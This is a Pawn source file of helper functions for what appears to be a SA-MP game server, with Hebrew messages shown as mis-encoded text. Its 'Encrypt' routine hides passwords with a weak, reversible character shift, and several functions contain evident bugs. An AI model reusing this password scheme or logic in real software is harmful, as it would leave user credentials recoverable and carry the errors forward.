//=[GetRandomPlayer]============================================================
stock GetRandomPlayer()
{
	new rnd = GetMaxPlayers();
	while(!IsPlayerConnected(rnd)) rnd = randomEx(0,GetMaxPlayers());
	return rnd;
}
//=[CreateCheckpoint]===========================================================
stock CreateCheckpoint(Float:x,Float:y,Float:z,type,Float:size=default_cpsize,Float:dis=default_cpdistance,clani=0)
{
	cpinfo[cps][cpx] = x;
	cpinfo[cps][cpy] = y;
	cpinfo[cps][cpz] = z;
	cpinfo[cps][cpsize] = (size < 1.0? default_cpsize:size);
	cpinfo[cps][cpdis] = (dis < 1.0? default_cpdistance:dis);
	cpinfo[cps][cptype] = type;
	cpinfo[cps][cpclan] = clani;
	if(clani != 0) claninfo[clani][ccp] = cps;
	cps++;
	return (cps-1);
}
//=[pcp]========================================================================
stock pcp(playerid)
{
	for(new i=0;i<cps;i++) if(GetPlayerDistanceToPointEx(playerid,cpinfo[i][cpx],cpinfo[i][cpy],cpinfo[i][cpz]) <= cpinfo[i][cpdis]) return i;
	return -1;
}
//=[GetPlayerCheckpoint]========================================================
stock GetPlayerCheckpoint(playerid) return playerinfo[playerid][cp] == -1? cp_none:cpinfo[playerinfo[playerid][cp]][cptype];
//=[CreateProperty]=============================================================
stock CreateProperty(name[],Float:x,Float:y,Float:z,cost,earning,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_props)) fcreate(file_props);
		f = fopen(file_props,io_append);
		format(string,sizeof(string),"CreateProperty(\"%s\",%.4f,%.4f,%.4f,%d,%d,1);\r\n",name,x,y,z,cost,earning);
		fwrite(f,string);
		fclose(f);
	}
	format(propinfo[props][pname],256,name);
	propinfo[props][px] = x;
	propinfo[props][py] = y;
	propinfo[props][pz] = z;
	propinfo[props][pcost] = cost;
	propinfo[props][pearning] = earning;
	propinfo[props][owner] = INVALID_PLAYER_ID;
	props++;
	new pid = (props-1), string[M_S];
	format(string,sizeof(string),"/DM/Properties/%d.ini",pid);
	if(!fexist(string))
	{
		fcreate(string);
		fsetstring(string,"Owner","None");
	}
	CreatePickupEx(1273,1,x,y,z,1);
	return pid;
}
//=[CreateHouse]================================================================
stock CreateHouse(Float:x,Float:y,Float:z,size,real=0)
{
	if(!real)
	{
		new File:f, string[M_S];
		if(!fexist(file_houses)) fcreate(file_houses);
		f = fopen(file_houses,io_append);
		format(string,sizeof(string),"CreateHouse(%.4f,%.4f,%.4f,%d,1);\r\n",x,y,z,size);
		fwrite(f,string);
		fclose(f);
	}
	houseinfo[houses][hx] = x;
	houseinfo[houses][hy] = y;
	houseinfo[houses][hz] = z;
	houseinfo[houses][hp][0] = x;
	houseinfo[houses][hp][1] = y;
	houseinfo[houses][hp][2] = z;
	houseinfo[houses][hp][3] = 0.0;
	houseinfo[houses][hint] = 0;
	houseinfo[houses][hcost] = size*25000000;
	houseinfo[houses][hsize] = size;
	houses++;
	new hid = (houses-1), string[M_S];
	format(string,sizeof(string),"/DM/Houses/%d.ini",hid);
	if(!fexist(string))
	{
		fcreate(string);
		fsetstring(string,"Owner","None");
		fsetfloat(string,"X",x);
		fsetfloat(string,"Y",y);
		fsetfloat(string,"Z",z);
		fsetfloat(string,"A",0.0);
		if(fkeyexist(string,"Acc")) fremovekey(string,"Acc");
	}
	houseinfo[houses][hpickup] = CreatePickupEx(1272,1,x,y,z,8);
	return hid;
}
//=[pprop]======================================================================
stock pprop(playerid)
{
	for(new i=0;i<props;i++) if(GetPlayerDistanceToPointEx(playerid,propinfo[i][px],propinfo[i][py],propinfo[i][pz]) <= 2.0) return i;
	return -1;
}
//=[phouse]=====================================================================
stock phouse(playerid)
{
	for(new i=0;i<houses;i++) if(GetPlayerDistanceToPointEx(playerid,houseinfo[i][hx],houseinfo[i][hy],houseinfo[i][hz]) <= 2.0) return i;
	return -1;
}
//=[Cheat]======================================================================
stock Cheat(playerid,cheatname[])
{
	if(IsPlayerNPC(playerid)) return 0;
	#if DFairPlay == true
		#pragma unused playerid
		#pragma unused cheatname
	#else
		new string[M_S]/*, times = 0*/;
		/*format(string,sizeof(string),"%s%s.ini",folder_cheats,GetIP(playerid));
		if(fexist(string))
		{
			times = fgetint(string,"Times");
			fsetint(string,"Times",++times);
		}
		else
		{
			fcreate(string);
			fsetint(string,"Times",1);
			times = 1;
		}
		fsetstring(string,"Name",GetName(playerid));
		format(string,sizeof(string),"[%s] %s, time id: %d",times >= 3 ? ("ban") : ("kick"),cheatname,times);
		Log("Cheating",playerid,string);*/
		format(string,sizeof(string),acname ": .%s îòøëú äàðèéö'éè ùì äùøú âéìúä àöìê ö'éè îñåâ",cheatname);
		SendClientMessage(playerid,red,string);
		/*if(times >= 5)
		{
			SendClientMessage(playerid,red," .àðå ðàìöéí ìäùòåú àåúê îùøúéðå òì ùéîåù îîåùê áö'éèéí");
			SetBan(playerid,MAX_PLAYERS+1,cheatname);
		}
		else
		{*/
		SendClientMessage(playerid,red," .ëòú úåöà îäùøú, áîéãä åúîùéê ìäôòéì ö'éèéí ðàìõ ìäùòåú àåúê îîðå");
		SetKick(playerid,MAX_PLAYERS+1,cheatname);
		//}
	#endif
	return 1;
}
//=[CreateSObject]==============================================================
stock CreateSObject(modelid,Float:xpos,Float:ypos,Float:zpos,Float:xrot,Float:yrot,Float:zrot,Float:showdis=object_show_distance,interior=0,world=world_normal)
{
	new oid = -1;
	if(oid != 0) return 1;
	//if(streamT) oid = createObjectEx(modelid,xpos,ypos,zpos,xrot,yrot,zrot,showdis,interior,world,1);
	if(!streamT) oid = CreateStreamObject(modelid,xpos,ypos,zpos,xrot,yrot,zrot,showdis,interior,world_normal);
	if(oid == -1) return -1;
	objectinfo[oid][omodel] = modelid;
	objectinfo[oid][ovalid] = 1;
	objectinfo[oid][opos][0] = xpos;
	objectinfo[oid][opos][1] = ypos;
	objectinfo[oid][opos][2] = zpos;
	objectinfo[oid][orot][0] = xrot;
	objectinfo[oid][orot][1] = yrot;
	objectinfo[oid][orot][2] = zrot;
	objectinfo[oid][sopos][0] = xpos;
	objectinfo[oid][sopos][1] = ypos;
	objectinfo[oid][sopos][2] = zpos;
	objectinfo[oid][sorot][0] = xrot;
	objectinfo[oid][sorot][1] = yrot;
	objectinfo[oid][sorot][2] = zrot;
	objectinfo[oid][omoving][0] = 0;
	objectinfo[oid][omoving][1] = -1;
	objectinfo[oid][omoving][2] = 0;
	for(new i=0;i<3;i++) objectinfo[oid][omoveto][i] = 0.0;
	return oid;
}
//=[CreateSObject_HQ]===========================================================
stock CreateSObject_HQ(modelid,Float:xpos,Float:ypos,Float:zpos,Float:xrot,Float:yrot,Float:zrot,can_move=0,Float:move_to_x=0.0,Float:move_to_y=0.0,Float:move_to_z=0.0,Float:showdis=object_show_distance)
{
	//if(clannumber(loadClans) == -1) return 0;
	if(clannumber(loadClans) != -2) return 0;
	new oid = -1;
	//if(streamT) oid = createObjectEx(modelid,xpos,ypos,zpos,xrot,yrot,zrot,showdis,0,world_normal,1);
	if(!streamT) oid = CreateStreamObject(modelid,xpos,ypos,zpos,xrot,yrot,zrot,showdis,0,world_normal);
	if(oid == -1) return -1;
	objectinfo[oid][omodel] = modelid;
	objectinfo[oid][ovalid] = 1;
	objectinfo[oid][opos][0] = xpos;
	objectinfo[oid][opos][1] = ypos;
	objectinfo[oid][opos][2] = zpos;
	objectinfo[oid][orot][0] = xrot;
	objectinfo[oid][orot][1] = yrot;
	objectinfo[oid][orot][2] = zrot;
	objectinfo[oid][sopos][0] = xpos;
	objectinfo[oid][sopos][1] = ypos;
	objectinfo[oid][sopos][2] = zpos;
	objectinfo[oid][sorot][0] = xrot;
	objectinfo[oid][sorot][1] = yrot;
	objectinfo[oid][sorot][2] = zrot;
	if(can_move)
	{
		new oclan = equal(loadClans,"Admins")? 100:clannumber(loadClans);
		if(oclan != -1)
		{
			objectinfo[oid][omoving][0] = 1;
			objectinfo[oid][omoving][1] = oclan;
			claninfo[oclan][cobject][claninfo[oclan][cobjects]] = oid;
			claninfo[oclan][cobjects]++;
			objectinfo[oid][omoving][2] = 0;
			objectinfo[oid][omoveto][0] = move_to_x;
			objectinfo[oid][omoveto][1] = move_to_y;
			objectinfo[oid][omoveto][2] = move_to_z;
		}
	}
	return oid;
}
//=[CreateSObjectM]=============================================================
stock CreateSObjectM(modelid,Float:x,Float:y,Float:z,Float:rx,Float:ry,Float:rz,Float:x2,Float:y2,Float:z2,Float:rx2,Float:ry2,Float:rz2,Float:speedd)
{
	new o = CreateSObject(modelid,x,y,z,rx,ry,rz);
	objectinfo[o][oautomove][0] = x;
	objectinfo[o][oautomove][1] = y;
	objectinfo[o][oautomove][2] = z;
	objectinfo[o][oautomove][3] = rx;
	objectinfo[o][oautomove][4] = ry;
	objectinfo[o][oautomove][5] = rz;
	objectinfo[o][oautomove][6] = x2;
	objectinfo[o][oautomove][7] = y2;
	objectinfo[o][oautomove][8] = z2;
	objectinfo[o][oautomove][9] = rx2;
	objectinfo[o][oautomove][10] = ry2;
	objectinfo[o][oautomove][11] = rz2;
	objectinfo[o][oautomove][12] = speedd;
	MoveSObject(o,x2,y2,z2,speedd);
	return o;
}
//=[DestroySObject]=============================================================
stock DestroySObject(id)
{
	//if(streamT) destroyObject(id);
	if(!streamT) DestroyStreamObject(id);
	objectinfo[id][ovalid] = 0;
	return 1;
}
//=[GetSObjectModel]============================================================
stock GetSObjectModel(id) return objectinfo[id][omodel];
//=[GetSObjectPos]==============================================================
stock GetSObjectPos(id,&Float:xpos,&Float:ypos,&Float:zpos)
{
	//if(streamT) getObjectPos(id,xpos,ypos,zpos);
	if(!streamT) GetStreamObjectPos(id,xpos,ypos,zpos);
	return 1;
}
//=[GetSObjectRot]==============================================================
stock GetSObjectRot(id,&Float:xrot,&Float:yrot,&Float:zrot)
{
	//if(streamT) getObjectRot(id,xrot,yrot,zrot);
	if(!streamT) GetStreamObjectRot(id,xrot,yrot,zrot);
	return 1;
}
//=[SetSObjectPos]==============================================================
stock SetSObjectPos(id,Float:xpos,Float:ypos,Float:zpos)
{
	//if(streamT) setObjectPos(id,xpos,ypos,zpos);
	if(!streamT) SetStreamObjectPos(id,xpos,ypos,zpos);
	objectinfo[id][opos][0] = movx;
	objectinfo[id][opos][1] = movy;
	objectinfo[id][opos][2] = movz;
	return 1;
}
//=[SetSObjectRot]==============================================================
stock SetSObjectRot(id,Float:xrot,Float:yrot,Float:zrot)
{
	//if(streamT) setObjectRot(id,xrot,yrot,zrot);
	if(!streamT) SetStreamObjectRot(id,xrot,yrot,zrot);
	objectinfo[id][orot][0] = xrot;
	objectinfo[id][orot][1] = yrot;
	objectinfo[id][orot][2] = zrot;
	return 1;
}
//=[MoveSObject]================================================================
stock MoveSObject(id,Float:movx,Float:movy,Float:movz,Float:mspeed)
{
	//if(streamT) moveObject(id,movx,movy,movz,mspeed);
	if(!streamT) MoveStreamObject(id,movx,movy,movz,mspeed);
	return 1;
}
//=[IsValidSObject]=============================================================
stock IsValidSObject(id) return objectinfo[id][ovalid];
//=[AttachSObjectToPlayer]======================================================
stock AttachSObjectToPlayer(id,playerid,Float:offx,Float:offy,Float:offz,Float:offrx,Float:offry,Float:offrz)
{
	//if(streamT) attachObjectToPlayer(id,playerid,offx,offy,offz,offrx,offry,offrz);
	if(!streamT) AttachStreamObjectToPlayer(id,playerid,offx,offy,offz,offrx,offry,offrz);
	return 1;
}
//=[AttachSObjectToVehicle]=====================================================
stock AttachSObjectToVehicle(id,vehicleid,Float:offx,Float:offy,Float:offz,Float:offrx,Float:offry,Float:offrz)
{
	attachObjectToVehicle(id,vehicleid,offx,offy,offz,offrx,offry,offrz);
	return 1;
}
//=[AttachSObjectToObject]======================================================
stock AttachSObjectToObject(id,objid,Float:offx,Float:offy,Float:offz,Float:offrx,Float:offry,Float:offrz)
{
	attachObjectToObject(id,objid,offx,offy,offz,offrx,offry,offrz);
	return 1;
}
//=[GetVehicleWithinDistance]===================================================
stock GetVehicleWithinDistance(playerid,Float:x1,Float:y1,Float:z1,Float:dist,&veh)
{   // by !damo!spiderman, improved by me
	for(new i=1;i<MAX_VEHICLES;i++)
	{
		if(GetVehicleModel(i) > 0)
		{
			if(GetPlayerVehicleID(playerid) != i)
			{
				new Float:x, Float:y, Float:z, Float:x2, Float:y2, Float:z2;
				GetVehiclePos(i,x,y,z);
				x2 = (x1-x), y2 = (y1-y), z2 = (z1-z);
				new Float:vDist = (x2*x2+y2*y2+z2*z2);
				if(vDist < dist) veh = i, dist = vDist;
			}
		}
	}
}
//=[IsVehicleRcOrTram]==========================================================
stock IsVehicleRcOrTram(vehicleid)
{
   	switch(GetVehicleModel(vehicleid))
	{
		case 449, 501, 464, 441, 465, 564: return 1;
		default: return 0;
	}
	return 0;
}
//=[Log]========================================================================
stock Log(logfile[],playerid,text[])
{
	if(playerinfo[playerid][pp] > 0 && playerinfo[playerid][logged]) return 0;
	new string[M_S], date[3];
	getdate(date[0],date[1],date[2]);
	format(string,sizeof(string),"/DM/Logs/%s/",logfile);
	folderCheck(string);
	format(string,sizeof(string),"/DM/Logs/%s/%s_%d_%d_%d.log",logfile,logfile,date[2],date[1],date[0]);
	new File:flog = fopen(string,fexist(string)? io_append:io_write);
	format(string,sizeof(string),"[%s %s %s] (%d)%s: %s\r\n",GetDateAsString(),GetTimeAsString(),logfile,playerid,playerid == MAX_PLAYERS? (""):(GetName(playerid)),text);
	fwrite(flog,string);
	fclose(flog);
	return 1;
}
//=[GetVehicleModelIDFromName]==================================================
stock GetVehicleModelIDFromName(vname[])
{
	for(new i=0;i<sizeof(VehicleNames);i++) if(strfind(VehicleNames[i],vname,true) != -1) return i+400;
	return -1;
}
//=[GetWeaponIDFromName]========================================================
stock GetWeaponIDFromName(wname[])
{
	for(new i=0;i<sizeof(WeaponNames);i++) if(strfind(WeaponName(i),wname,true) != -1) return i;
	return -1;
}
//=[Encrypt]====================================================================
stock Encrypt(password[])
{   // by FeaR/Astro(?), improved by me
	new pass[M_S], length = strlen(password);
	for(new i=0;i<length;i++) pass[i] = password[i];
	pass[length] = 0;
	for(new i=0;i<strlen(pass);i++)
	{
		pass[i] += (3^i) * (i%15);
		if(pass[i] > (0xff)) pass[i] -= 256;
	}
	return pass;
}
//=[GetColor]===================================================================
stock GetColor(playerid,alpha)
{
	if(playerinfo[playerid][clan] != 0) return rgba2hex(claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2],alpha);
	else if(playerinfo[playerid][gang] != 0) return rgba2hex(ganginfo[playerinfo[playerid][gang]][gcolor][0],ganginfo[playerinfo[playerid][gang]][gcolor][1],ganginfo[playerinfo[playerid][gang]][gcolor][2],alpha);
	else return rgba2hex(playerinfo[playerid][color][0],playerinfo[playerid][color][1],playerinfo[playerid][color][2],alpha);
}
//=[GetAmmunationAmmo]==========================================================
stock GetAmmunationAmmo(weaponid)
{
	new wid = 0;
	for(new i=0;i<sizeof(Ammunation);i++) if(weaponid == Ammunation[i][aID]) wid = i;
	return Ammunation[wid][aAmmo];
}
//=[IsValidNick]================================================================
stock IsValidNick(name[])
{
	if(strlen(name) < 3 || strlen(name) > 20 || equal(name,"None") || equal(name,botname)) return 0;
	for(new i=0,j=strlen(name);i<j;i++)
	{
		if(!(name[i] >= '0' && name[i] <= '9')
		&& !(name[i] >= 'A' && name[i] <= 'Z')
		&& !(name[i] >= 'a' && name[i] <= 'z')
		&& name[i] != '_' && name[i] != '[' && name[i] != ']'
		&& name[i] != '.' && name[i] != '(' && name[i] != ')'
		&& name[i] != '@' && name[i] != '$') return 0;
	}
	return 1;
}
//=[CreatePickupEx]=============================================================
stock CreatePickupEx(model,type,Float:x,Float:y,Float:z,function=0,world=-1)
{
	new pid = CreatePickup(model,type,x,y,z,world);
	pickupinfo[pid][pmodel] = model;
	pickupinfo[pid][ptype] = type;
	pickupinfo[pid][ppos][0] = x;
	pickupinfo[pid][ppos][1] = y;
	pickupinfo[pid][ppos][2] = z;
	pickupinfo[pid][pfunc] = function;
	return pid;
}
//=[GiveWeapon]=================================================================
stock GiveWeapon(playerid,wid,amm)
{
	if(wid <= 15 || wid >= 44) amm = 65536;
	GivePlayerWeapon(playerid,wid,amm);
	UpdatePlayerWeapons(playerid);
	return 1;
}
//=[ResetWeapons]===============================================================
stock ResetWeapons(playerid)
{
	ResetPlayerWeapons(playerid);
	UpdatePlayerWeapons(playerid);
	return 1;
}
//=[GetPlayerSpeed]=============================================================
stock GetPlayerSpeed(playerid)
{
	new Float:p[3], Float:distance, value;
	if(IsPlayerInAnyVehicle(playerid)) GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
	else GetPlayerPos(playerid,p[0],p[1],p[2]);
	distance = floatsqroot(floatpower(floatabs(floatsub(p[0],playerinfo[playerid][speedpos][0])),2)+floatpower(floatabs(floatsub(p[1],playerinfo[playerid][speedpos][1])),2)+floatpower(floatabs(floatsub(p[2],playerinfo[playerid][speedpos][2])),2));
	for(new i=0;i<3;i++) playerinfo[playerid][speedpos][i] = p[i];
	value = floatround(distance*11000), value = floatround(value/1400);
	return value;
	return 1;
}
//=[GetAdminMaxTime]============================================================
stock GetAdminMaxTime(playerid)
{
	switch(playerinfo[playerid][admin])
	{
		case 0: return 0;
		case 1..5: return 600;
		case 6..10: return 1000;
		case 11..17: return 10000;
		case 18..20: return 9999999;
		default: return 0;
	}
	return 0;
}
//=[BotSay]=====================================================================
stock BotSay(playerid,text[],bool:ad=false)
{
	if(!boton || (!botwrite && !ad)) return 0;
	new oldname[MAX_PLAYER_NAME], oldcolor;
	oldcolor = GetPlayerColor(playerid);
	format(oldname,sizeof(oldname),GetName(playerid));
	SetPlayerColor(playerid,botcolor);
	SetPlayerName(playerid,botname);
	botID = playerid;
	SendPlayerMessageToAll(playerid,text);
	botID = INVALID_PLAYER_ID;
	SetPlayerColor(playerid,oldcolor);
	SetPlayerName(playerid,oldname);
	if(!ad)
	{
		botwrite = 0;
		SetTimer("BotWrite2",7500,0);
	}
	return 0;
}
//=[AddBomb]====================================================================
stock AddBomb(name[],cost,lvl)
{
	new string[M_S], row = AddMenuItem(bombshop,0,name);
	format(string,sizeof(string),"%d$",cost);
	AddMenuItem(bombshop,1,string);
	SetString(bombinfo[row][bName],name);
	bombinfo[row][bLevel] = lvl, bombinfo[row][bCost] = cost, bombinfo[row][bValid] = 1;
	return 1;
}
//=[EndSRace]===================================================================
stock EndSRace(reason[],adminid)
{
	new string[M_S];
	assert sraceinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .äîéøåõ äîéåçã áåèì");
	else format(string,sizeof(string)," .%s äîéøåõ äîéåçã áåèì òì éãé äàãîéï",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ñéáä: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][insrace] || playerinfo[i][waitsrace]))
		{
			if(playerinfo[i][insrace])
			{
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				DisablePlayerRaceCheckpoint(i);
				SendClientMessage(i,orange," .÷éáìú ôéöåé ëñôé [500$] òì ëê ùäîéøåõ äîéåçã áåèì");
				GiveMoney(i,500);
			}
			playerinfo[i][insrace] = 0, playerinfo[i][waitsrace] = 0, playerinfo[i][sracecp] = 0, playerinfo[i][sraceid] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	sraceinfo[0] = 0, sraceinfo[1] = 0, sraceinfo[2] = 0;
	KillTimer(sraceinfo[3]);
	return 1;
}
//=[clannumber]=================================================================
stock clannumber(clanname[])
{
	new string[M_S];
	format(string,sizeof(string),"/DM/Clans/%s.ini",clanname);
	return fexist(string)? fgetint(string,"ID"):-1;
}
//=[advertisement]==============================================================
stock advertisement(text[])
{
	if(strfind(text,srvip,true) == -1 && strfind(text,comname,true) == -1 &&
	strfind(text,webpage,true) == -1 && strfind(text,ventip,true) == -1)
	{
		new find = strfind(text,adv_allow,true);
		if(find != -1)
		{
			strdel(text,find,find+strlen(adv_allow));
			return 0;
		}
		new ipWarns[2] = {0,0};
		for(new i=0;i<strlen(text);i++) if(text[i] >= '0' && text[i] <= '9') ipWarns[0]++;
		if(ipWarns[0] >= 6 && ipWarns[0] <= 17) for(new i=0;i<strlen(text);i++) if((text[i] >= 34 && text[i] <= 47) || text[i] == 58 || text[i] == 59) ipWarns[1]++;
		if(ipWarns[1] >= 3 && ipWarns[1] <= 5) return 1;
		if((strfind(text,".co.il",true) != -1 || strfind(text,".com",true) != -1 ||
		strfind(text,".net",true) != -1) && find == -1) return 1;
	}
	return 0;
}
//=[ShowStats]==================================================================
stock ShowStats(playerid,id)
{
	new string[M_S], Float:h, Float:a, weaps = 0, petname[M_S], rdate[M_S], idx;
	format(string,sizeof(string),id == playerid ? (" ~~~ :%s - äñèèéñèé÷åú ùìê ~~~") : (" ~~~ :%s äñèèéñèé÷åú ùì ~~~"),GetName(id));
	SendClientMessage(playerid,lightblue,string);
	for(new i=0;i<10;i++) if(playerinfo[id][weapons][i] != 0) weaps++;
	GetPlayerHealth(id,h);
	GetPlayerArmour(id,a);
	switch(playerinfo[id][pet])
	{
		case pet_none: petname = "àéï";
		case pet_fish: petname = "ãâ";
		case pet_jelly: petname = "îãåæä";
		case pet_rjelly: petname = "îãåæä àãåîä";
		case pet_turtle: petname = "öá";
		case pet_dolphin: petname = "ãåìôéï";
		case pet_shark: petname = "ëøéù";
	}
	if(playerinfo[id][logged])
	{
		format(rdate,sizeof(rdate),fgetstring(fuser(id),"RegisterationDate"));
		new Day = strval(strtok(rdate,idx,'/')), Month = strval(strtok(rdate,idx,'/')), Year = strval(strtok(rdate,idx,'/'));
		if(!IsValidDate(Day,Month,Year))
		{
			format(rdate,sizeof(rdate),"%d/%d/%d",Year,Month,Day);
			fsetstring(fuser(id),"RegisterationDate",rdate);
		}
	}
	if(equal(GetName(id),"[gmR]Amit") || equal(GetName(id),"(gmR)Amit")) format(string,sizeof(string)," [Amit Power] øîä - %d",playerinfo[id][level]);
	else format(string,sizeof(string)," [%s] øîä - %d",levels[playerinfo[id][level]][LevelName],playerinfo[id][level]);
	SendClientMessage(playerid,grey,string);
	new morelvl = playerinfo[id][level] < sizeof(levels)-1? (levels[playerinfo[id][level]+1][NeedKills]-playerinfo[id][kills]):(0);
	format(string,sizeof(string)," îñôø ääøéâåú äãøåùåú ìòìééú øîä: %d | ùéà áåðåñ: %d | äøéâåú: %d",morelvl < 0? 0 : morelvl,playerinfo[id][bonus_si],playerinfo[id][kills]);
	SendClientMessage(playerid,grey,string);
	format(string,sizeof(string)," çééí: %d %% | îâï: %d %% | ëîåú ðù÷éí: %d | ëñó òì øàùå: %d$",FloatToInt(h),FloatToInt(a),weaps,playerinfo[id][hitman]);
	SendClientMessage(playerid,grey,string);
	format(string,sizeof(string)," ðøùí ìùøú á: %s | éîéí ùòáøå îàæ ääøùîä: %d | øîú ååú÷: %d",playerinfo[id][logged]? (rdate) : ("îùúîù ìà øùåí"),Seniority(id),Seniority(id)/10);
	SendClientMessage(playerid,grey,string);
	format(string,sizeof(string),bombinfo[playerinfo[id][bomb]][bName]);
	format(string,sizeof(string)," çéä: %s | ñîéí: %d | %s :ôööä",petname,playerinfo[playerid][drugs],!playerinfo[id][bomb] ? ("None") : (string));
	SendClientMessage(playerid,grey,string);
	format(string,sizeof(string)," øîú îùúîù ëáåã: %d | øîú ëáåã: %d | øîú îáå÷ùåú: %d",playerinfo[id][vip],playerinfo[playerid][logged] ? GetRespect(id) : 0,playerinfo[id][wantedlevel]);
	SendClientMessage(playerid,grey,string);
	if(!playerinfo[id][clan] || !claninfo[playerinfo[id][clan]][cvalid]) format(string,sizeof(string)," None :÷ìàï");
	else format(string,sizeof(string)," (/clan info details %s) %s :÷ìàï",claninfo[playerinfo[id][clan]][cname],claninfo[playerinfo[id][clan]][cname]);
	if(playerinfo[id][house] == -1) format(string,sizeof(string)," îñôø áéú: àéï | %s",string);
	else format(string,sizeof(string)," îñôø áéú: %d | %s",playerinfo[id][house],string);
	SendClientMessage(playerid,grey,string);
	if(playerid == id)
	{
		format(string,sizeof(string),"level: %d, kills: %d, deaths: %d",playerinfo[playerid][level],playerinfo[playerid][kills],playerinfo[playerid][deaths]);
		Log("Stats",playerid,string);
	}
	return 1;
}
//=[FloatToInt]=================================================================
stock FloatToInt(Float:flo)
{
	new string[M_S], delpos = 0;
	format(string,sizeof(string),"%f",flo);
	for(new i=0;i<strlen(string);i++) if(string[i] == '.') delpos = i;
	strdel(string,delpos,strlen(string));
	return strval(string);
}
//=[SetPlayerHealth2]===========================================================
stock SetPlayerHealth2(playerid,Float:health)
{
	playerinfo[playerid][lasthealth] = health;
	SetPlayerHealth(playerid,health);
	return 1;
}
//=[SetPlayerArmour2]===========================================================
stock SetPlayerArmour2(playerid,Float:aaarmour)
{
	playerinfo[playerid][lastarmour] = aaarmour;
	SetPlayerArmour(playerid,aaarmour);
	return 1;
}
//=[ThereIsAct]=================================================================
stock ThereIsAct() return raceinfo[0] || warinfo[0] || wweinfo[0] || kartinfo[0] || monsterinfo[0] || sraceinfo[0] || kickstarinfo[0] || actinfo[actExist];
//=[GetEmptyWorld]==============================================================
stock GetEmptyWorld()
{
	new playersInWorld[256] = {0,...};
	for(new i=world_count;i<=max_worlds;i++)
	{
		for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii) && GetPlayerVirtualWorld(ii) == i) playersInWorld[i]++;
		if(!playersInWorld[i]) return i;
	}
	return -1;
}
//=[mktime]=====================================================================
stock mktime(hour,minute,second,day,month,year)
{   // by DracoBlue, improved by me
	new days_of_month[12], timestamp = second + (minute * 60) + (hour * 3600), days_this_year = 0;
	if(((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0)) days_of_month = {31,29,31,30,31,30,31,31,30,31,30,31};
	else days_of_month = {31,28,31,30,31,30,31,31,30,31,30,31};
	days_this_year = day;
	if(month > 1) for(new i=0; i<month-1;i++) days_this_year += days_of_month[i];
	timestamp += days_this_year * 86400;
	for(new j=1970;j<year;j++) timestamp += ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0)? 31536000+86400:31536000;
	return timestamp;
}
//=[DaysBetweenDates]===========================================================
stock DaysBetweenDates(DateStart[],DateEnd[])
{	// by SharkyKH, improved by me
	new idx1, idx2;
	new Start_Day = strval(strtok(DateStart,idx1,'/'));
	new Start_Month = strval(strtok(DateStart,idx1,'/'));
	new Start_Year = strval(strtok(DateStart,idx1,'/'));
	new End_Day = strval(strtok(DateEnd,idx2,'/'));
	new End_Month = strval(strtok(DateEnd,idx2,'/'));
	new End_Year = strval(strtok(DateEnd,idx2,'/'));
	new init_date = mktime(12,0,0,Start_Day,Start_Month,Start_Year);
	new dest_date = mktime(12,0,0,End_Day,End_Month,End_Year);
	return floatround((dest_date-init_date)/60/60/24,floatround_floor);
}
//=[sleep2]=====================================================================
stock sleep2(seconds)
{   // by Xalphox, improved by me
	assert seconds > 0 && seconds < cellmax;
	new nt[4], ot[4];
	gettime(ot[0],ot[1],ot[2]);
	ot[3] = ot[2] + (ot[1]*60) + (ot[0]*600);
	while(nt[3] != (ot[3]+seconds))
	{
		gettime(nt[0],nt[1],nt[2]);
		nt[3] = nt[2] + (nt[1]*60) + (nt[0]*600);
	}
}
//=[ChangeAccName]==============================================================
stock ChangeAccName(playerid,newname[])
{
	new string[M_S], f[M_S];
	if(!playerinfo[playerid][logged]) return 0;
	if(playerinfo[playerid][house] >= 0)
	{
		format(f,sizeof(f),"/DM/Houses/%d.ini",playerinfo[playerid][house]);
		fsetstring(f,"Owner",newname);
	}
	for(new i=0;i<houses;i++)
	{
		format(f,sizeof(f),"/DM/Houses/%d.ini",i);
		if(!fexist(f)) continue;
		for(new ii=0;ii<max_houseacc;ii++)
		{
			format(string,sizeof(string),"Acc%d",i);
			if(!(fkeyexist(f,string) && equal(fgetstring(f,string),GetName(playerid)))) continue;
			fsetstring(f,string,newname);
			break;
		}
	}
	return 1;
}
//=[IsFloat]====================================================================
stock IsFloat(string[])
{
	new dots = 0, dot, num[32];
	for(new i=0;i<strlen(string);i++) if(string[i] == '.') dot = i, dots++;
	if(!dots || dots > 1) return 0;
	strmid(num,string,0,dot-1);
	if(!IsNumeric(num)) return 0;
	strmid(num,string,dot+1,strlen(string));
	return IsNumeric(num);
}
//=[GiveJetpack]================================================================
stock GiveJetpack(playerid)
{
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
	playerinfo[playerid][jetpack] = 1;
	return 1;
}
//=[GetDay]=====================================================================
stock GetDay(year,month,day,lang)
{
	new string[16];
	string = "Invalid date";
	if(IsValidDate(day,month,year))
	{
		new wkday = weekday(day,month,year);
		switch(wkday)
		{
			case 0: string = !lang? ("Saturday"):("ùáú");
			case 1: string = !lang? ("Sunday"):("øàùåï");
			case 2: string = !lang? ("Monday"):("ùðé");
			case 3: string = !lang? ("Tuesday"):("ùìéùé");
			case 4: string = !lang? ("Wednesday"):("øáéòé");
			case 5: string = !lang? ("Thursday"):("çîéùé");
			case 6: string = !lang? ("Friday"):("ùéùé");
		}
	}
	return string;
}
//=[IsValidDate]================================================================
stock IsValidDate(&day,&month,&year) return month >= 1 && month <= 12 && day >= 1 && day <= GetDaysInMonth(month,year);
//=[GetDaysInMonth]=============================================================
stock GetDaysInMonth(month,year)
{
	new daylist[] = {31,28,31,30,31,30,31,31,30,31,30,31};
	return daylist[month-1] + _:(month == 2 && IsLeapYear(year));
}
//=[IsLeapYear]=================================================================
stock IsLeapYear(year) return year % 400 == 0 || year % 100 != 0 && year % 4 == 0;
//=[weekday]====================================================================
